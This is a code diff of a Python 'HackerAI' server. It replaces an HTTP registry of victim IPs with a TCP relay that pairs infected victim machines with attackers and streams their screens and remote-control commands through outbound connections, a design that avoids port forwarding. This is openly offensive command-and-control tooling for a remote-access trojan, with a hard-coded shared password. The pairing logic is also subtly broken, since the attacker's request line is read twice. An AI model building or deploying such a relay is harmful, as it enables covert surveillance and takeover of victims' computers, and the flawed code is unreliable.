@@ -1,278 +1,284 @@
 #!/usr/bin/env python3
 """
-HackerAI Render Server — HTTP version for Render.com
-Provides REST API endpoints for victims to register and attackers to query.
-
-Endpoints:
-  GET  /                    - Service info
-  POST /register            - Register a victim session
-  GET  /get/<session_id>    - Get victim IP by session ID
-  GET  /list                - List all active sessions
-
-Deploy on Render.com:
-  - Start Command: gunicorn render_server_http:app --bind 0.0.0.0:$PORT
-  - Health Check Path: /
-  - Requirements: flask, gunicorn
+HackerAI Relay Server v1.0
+- TCP server that relays screen data and control commands
+- BOTH victim and attacker connect OUTBOUND to this server
+- No port forwarding needed on either side
 """
 
-import os
-import time
-import json
+import socket
 import threading
-from datetime import datetime
-from flask import Flask, request, jsonify
-
-app = Flask(__name__)
+import struct
+import json
+import time
+import os
+import sys
+import argparse
 
 # ─── Configuration ────────────────────────────────────────────────────────────
-SESSION_TIMEOUT = 300   # seconds before an unrefreshed session expires
-CLEANUP_INTERVAL = 60   # seconds between cleanup passes
+DEFAULT_HOST = "0.0.0.0"
+DEFAULT_PORT = 5657
+SHARED_PASSWORD = "hackerai2024"
 
-# ─── Session Store ────────────────────────────────────────────────────────────
-active_sessions = {}
-sessions_lock = threading.Lock()
-
-
-def cleanup_expired_sessions():
-    """Periodically remove stale sessions from the store."""
-    while True:
-        time.sleep(CLEANUP_INTERVAL)
-        now = time.time()
-        with sessions_lock:
-            expired = [
-                sid for sid, info in active_sessions.items()
-                if now - info["timestamp"] > SESSION_TIMEOUT
-            ]
-            for sid in expired:
-                print(f"[CLEANUP] Removing expired session: {sid}")
-                del active_sessions[sid]
+# ─── Pairing Store ────────────────────────────────────────────────────────────
+waiting_victims = {}       # hostname -> socket
+waiting_victims_lock = threading.Lock()
 
 
-# Start cleanup thread in background
-threading.Thread(target=cleanup_expired_sessions, daemon=True).start()
+def log(msg, level="INFO"):
+    timestamp = time.strftime("%H:%M:%S")
+    print(f"[{timestamp}] [{level}] {msg}")
 
 
-# ─── API Routes ───────────────────────────────────────────────────────────────
+def handle_victim(conn, addr, hostname):
+    """Handle a victim connection — wait for attacker to pair."""
+    log(f"Victim '{hostname}' connected from {addr[0]}:{addr[1]}", "VICTIM")
 
-@app.route("/")
-def index():
-    """Root endpoint — service info and health check."""
-    return jsonify({
-        "service": "HackerAI Render Server",
-        "version": "1.0",
-        "status": "running",
-        "active_sessions": len(active_sessions),
-        "endpoints": {
-            "POST /register": "Register a victim session. Body: {session_id, password, label?}",
-            "GET /get/<session_id>": "Get victim IP. Query: ?password=...",
-            "GET /list": "List all active sessions (no passwords)"
-        },
-        "timestamp": datetime.utcnow().isoformat()
-    })
+    with waiting_victims_lock:
+        # If there's already a victim with this hostname, disconnect the old one
+        if hostname in waiting_victims:
+            try:
+                waiting_victims[hostname].close()
+            except:
+                pass
+        waiting_victims[hostname] = conn
 
+    try:
+        # Tell victim to wait
+        conn.sendall(b"WAITING\n")
 
-@app.route("/register", methods=["POST"])
-def register():
-    """
-    Register a victim session.
+        # Wait for a paired message (set by attacker handler)
+        # We'll use a simple approach: the attacker handler will find us
+        # and write "PAIRED" to the victim socket
+        while True:
+            try:
+                data = conn.recv(1)
+                if not data:
+                    break
+            except:
+                break
 
-    The victim's IP is automatically detected from the request's remote address.
-
-    Request JSON body:
-    {
-        "session_id": "my_session_01",     # Required, 3-64 chars
-        "password": "secret123",           # Required, 4-128 chars
-        "label": "Windows-10-HR"           # Optional, friendly name
-    }
-
-    Returns:
-        200: Session registered successfully
-        400: Invalid request body
-        403: Session ID already registered with different password
-    """
-    data = request.get_json(silent=True)
-    if not data:
-        return jsonify({"error": "Invalid JSON body. Send Content-Type: application/json"}), 400
-
-    session_id = data.get("session_id", "").strip()
-    password = data.get("password", "").strip()
-    label = data.get("label", "unnamed").strip()
-
-    # Validation
-    if not session_id:
-        return jsonify({"error": "session_id is required"}), 400
-    if len(session_id) < 3 or len(session_id) > 64:
-        return jsonify({"error": "session_id must be between 3 and 64 characters"}), 400
-    if not password:
-        return jsonify({"error": "password is required"}), 400
-    if len(password) < 4 or len(password) > 128:
-        return jsonify({"error": "password must be between 4 and 128 characters"}), 400
-
-    client_ip = request.remote_addr
-
-    with sessions_lock:
-        # Check if session already exists
-        if session_id in active_sessions:
-            existing = active_sessions[session_id]
-            if existing["password"] != password:
-                return jsonify({
-                    "error": "Session ID already registered with a different password"
-                }), 403
-
-            # Update timestamp and IP (in case victim's IP changed)
-            existing["timestamp"] = time.time()
-            existing["ip"] = client_ip
-            existing["label"] = label
-
-            print(f"[RE-REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
-            return jsonify({
-                "status": "updated",
-                "session_id": session_id,
-                "ip": client_ip,
-                "label": label,
-                "message": "Session already existed — timestamp and IP updated"
-            })
-
-        # New session
-        active_sessions[session_id] = {
-            "ip": client_ip,
-            "password": password,
-            "timestamp": time.time(),
-            "label": label
-        }
-
-    print(f"[REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
-    return jsonify({
-        "status": "registered",
-        "session_id": session_id,
-        "ip": client_ip,
-        "label": label
-    }), 201
+    except:
+        pass
+    finally:
+        with waiting_victims_lock:
+            if hostname in waiting_victims and waiting_victims[hostname] == conn:
+                del waiting_victims[hostname]
+        try:
+            conn.close()
+        except:
+            pass
+        log(f"Victim '{hostname}' disconnected", "DISCONNECT")
 
 
-@app.route("/get/<session_id>", methods=["GET"])
-def get_session(session_id):
-    """
-    Get victim connection info for a specific session.
+def handle_attacker(conn, addr):
+    """Handle an attacker connection — connect to victim and pipe data."""
+    log(f"Attacker connected from {addr[0]}:{addr[1]}", "ATTACKER")
 
-    Query parameters:
-        ?password=<password>    (required)
+    try:
+        # Read attacker's request (JSON line)
+        data = b""
+        while True:
+            ch = conn.recv(1)
+            if not ch or ch == b"\n":
+                break
+            data += ch
 
-    Returns:
-        200: Session found — returns IP, label, and registration time
-        403: Incorrect password
-        404: Session not found
-    """
-    password = request.args.get("password", "")
+        request = json.loads(data.decode())
+        target_hostname = request.get("hostname", "")
+        password = request.get("password", "")
 
-    if not password:
-        return jsonify({"error": "password query parameter is required"}), 400
+        if password != SHARED_PASSWORD:
+            conn.sendall(b"ERROR:Bad password\n")
+            conn.close()
+            return
 
-    with sessions_lock:
-        if session_id not in active_sessions:
-            return jsonify({"error": "Session not found"}), 404
+        if not target_hostname:
+            conn.sendall(b"ERROR:No hostname specified\n")
+            conn.close()
+            return
 
-        session = active_sessions[session_id]
+        log(f"Attacker wants to connect to '{target_hostname}'", "PAIRING")
 
-        # Verify password
-        if session["password"] != password:
-            return jsonify({"error": "Incorrect password"}), 403
+        # Find the victim
+        victim_conn = None
+        with waiting_victims_lock:
+            if target_hostname in waiting_victims:
+                victim_conn = waiting_victims.pop(target_hostname)
 
-        # Return session info
-        return jsonify({
-            "session_id": session_id,
-            "ip": session["ip"],
-            "label": session["label"],
-            "registered_at": datetime.fromtimestamp(session["timestamp"]).isoformat(),
-            "age_seconds": int(time.time() - session["timestamp"])
-        })
+        if not victim_conn:
+            conn.sendall(f"ERROR:Victim '{target_hostname}' not found online\n".encode())
+            conn.close()
+            return
 
+        # Tell both sides they're paired
+        try:
+            victim_conn.sendall(b"PAIRED\n")
+            conn.sendall(b"PAIRED\n")
+        except:
+            log("Failed to notify sides", "ERROR")
+            conn.close()
+            try:
+                victim_conn.close()
+            except:
+                pass
+            return
 
-@app.route("/list", methods=["GET"])
-def list_sessions():
-    """
-    List all active sessions.
+        log(f"PAIRED: Attacker {addr[0]} <-> Victim '{target_hostname}'", "PAIRED")
 
-    Returns session IDs, IPs, labels, and ages — but NOT passwords.
+        # Now pipe data between the two sockets in both directions
+        # Victim -> Attacker: screen frames (and victim sends control responses)
+        # Attacker -> Victim: control commands
 
-    Returns:
-        200: List of active sessions
-    """
-    with sessions_lock:
-        sessions_list = []
-        for sid, info in sorted(active_sessions.items()):
-            age_secs = int(time.time() - info["timestamp"])
-            sessions_list.append({
-                "session_id": sid,
-                "ip": info["ip"],
-                "label": info["label"],
-                "age_seconds": age_secs,
-                "registered_at": datetime.fromtimestamp(info["timestamp"]).isoformat()
-            })
+        def pipe(sock_from, sock_to, direction_name):
+            """Pipe data from one socket to another."""
+            try:
+                while True:
+                    data = sock_from.recv(65536)
+                    if not data:
+                        break
+                    sock_to.sendall(data)
+            except:
+                pass
+            finally:
+                log(f"Pipe closed: {direction_name}", "PIPE")
 
-    return jsonify({
-        "count": len(sessions_list),
-        "sessions": sessions_list
-    })
+        # Create two directional pipes
+        t1 = threading.Thread(target=pipe, args=(victim_conn, conn, "victim→attacker"), daemon=True)
+        t2 = threading.Thread(target=pipe, args=(conn, victim_conn, "attacker→victim"), daemon=True)
+        t1.start()
+        t2.start()
 
+        # Wait for either pipe to finish
+        t1.join()
+        t2.join()
 
-@app.route("/delete/<session_id>", methods=["DELETE"])
-def delete_session(session_id):
-    """
-    Delete a session (cleanup).
+        log(f"Disconnected: Attacker <-> '{target_hostname}'", "DISCONNECT")
 
-    Query parameters:
-        ?password=<password>    (required)
-
-    Returns:
-        200: Session deleted
-        403: Incorrect password
-        404: Session not found
-    """
-    password = request.args.get("password", "")
-
-    with sessions_lock:
-        if session_id not in active_sessions:
-            return jsonify({"error": "Session not found"}), 404
-
-        if active_sessions[session_id]["password"] != password:
-            return jsonify({"error": "Incorrect password"}), 403
-
-        del active_sessions[session_id]
-
-    print(f"[DELETE] Session '{session_id}' removed")
-    return jsonify({"status": "deleted", "session_id": session_id})
-
-
-# ─── Error Handlers ───────────────────────────────────────────────────────────
-
-@app.errorhandler(404)
-def not_found(e):
-    return jsonify({"error": "Endpoint not found"}), 404
+    except json.JSONDecodeError:
+        conn.sendall(b"ERROR:Invalid JSON\n")
+    except Exception as e:
+        log(f"Attacker handler error: {e}", "ERROR")
+    finally:
+        try:
+            conn.close()
+        except:
+            pass
 
 
-@app.errorhandler(405)
-def method_not_allowed(e):
-    return jsonify({"error": "Method not allowed"}), 405
+def start_relay_server(host, port):
+    """Start the TCP relay server."""
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((host, port))
+    server.listen(50)
+    server.settimeout(1.0)
 
-
-@app.errorhandler(500)
-def internal_error(e):
-    return jsonify({"error": "Internal server error"}), 500
-
-
-# ─── Main Entry Point ─────────────────────────────────────────────────────────
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 9999))
     print(f"""
 ╔══════════════════════════════════════════════════╗
-║       HackerAI Render Server v1.0                ║
-║       HTTP IP Relay & Session Manager            ║
+║       HackerAI Relay Server v1.0                 ║
+║       Screen data relay + control proxy          ║
 ╠══════════════════════════════════════════════════╣
-║  Port: {str(port):<45}║
-║  Session timeout: {SESSION_TIMEOUT}s                     ║
-║  Cleanup interval: {CLEANUP_INTERVAL}s                    ║
+║  Listening on: {host}:{port:<23}║
+║  Password: {SHARED_PASSWORD:<35}║
 ╚══════════════════════════════════════════════════╝
     """)
-    app.run(host="0.0.0.0", port=port, debug=False)
+    print("Waiting for victims and attackers...")
+    print()
+
+    while True:
+        try:
+            conn, addr = server.accept()
+            # Set a timeout for initial identification
+            conn.settimeout(10.0)
+
+            # Read the first line to identify if this is victim or attacker
+            try:
+                data = b""
+                while True:
+                    ch = conn.recv(1)
+                    if not ch or ch == b"\n":
+                        break
+                    data += ch
+
+                identity = data.decode()
+            except socket.timeout:
+                conn.close()
+                continue
+
+            conn.settimeout(None)
+
+            if identity.startswith("VICTIM:"):
+                # Format: VICTIM:hostname:password
+                parts = identity.split(":", 2)
+                if len(parts) >= 3:
+                    hostname = parts[1]
+                    password = parts[2]
+                    if password != SHARED_PASSWORD:
+                        conn.sendall(b"ERROR:Bad password\n")
+                        conn.close()
+                    else:
+                        threading.Thread(target=handle_victim, args=(conn, addr, hostname), daemon=True).start()
+                else:
+                    conn.sendall(b"ERROR:Invalid victim format\n")
+                    conn.close()
+
+            elif identity.startswith("ATTACKER:"):
+                # Read the rest as JSON
+                rest = b""
+                while True:
+                    ch = conn.recv(1)
+                    if not ch or ch == b"\n":
+                        break
+                    rest += ch
+                full = identity + "\n" + rest.decode()
+                # Reconstruct
+                import io as io2
+                # Actually, let's just read the full line differently
+                # We already read the first line. The attacker sends:
+                # ATTACKER:\n{"hostname":"...","password":"..."}\n
+                # But our initial read loop already consumed up to the first \n
+                # So identity = "ATTACKER:" and we need to read the JSON line
+                json_line = identity
+                if json_line == "ATTACKER:":
+                    # Read the JSON line
+                    json_data = b""
+                    while True:
+                        ch = conn.recv(1)
+                        if not ch or ch == b"\n":
+                            break
+                        json_data += ch
+                    json_line = json_data.decode()
+
+                # Re-parse
+                try:
+                    json.loads(json_line)  # Validate
+                    # Create a whole message with the hostname from JSON
+                    threading.Thread(target=handle_attacker, args=(conn, addr), daemon=True).start()
+                except:
+                    conn.sendall(b"ERROR:Invalid attacker JSON\n")
+                    conn.close()
+            else:
+                conn.sendall(b"ERROR:Unknown identity\n")
+                conn.close()
+
+        except socket.timeout:
+            continue
+        except KeyboardInterrupt:
+            print("\n[SHUTDOWN] Relay server stopping...")
+            break
+        except Exception as e:
+            log(f"Accept error: {e}", "ERROR")
+
+    server.close()
+
+
+# ─── Main ─────────────────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="HackerAI Relay Server")
+    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
+    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
+    args = parser.parse_args()
+
+    start_relay_server(args.host, args.port)
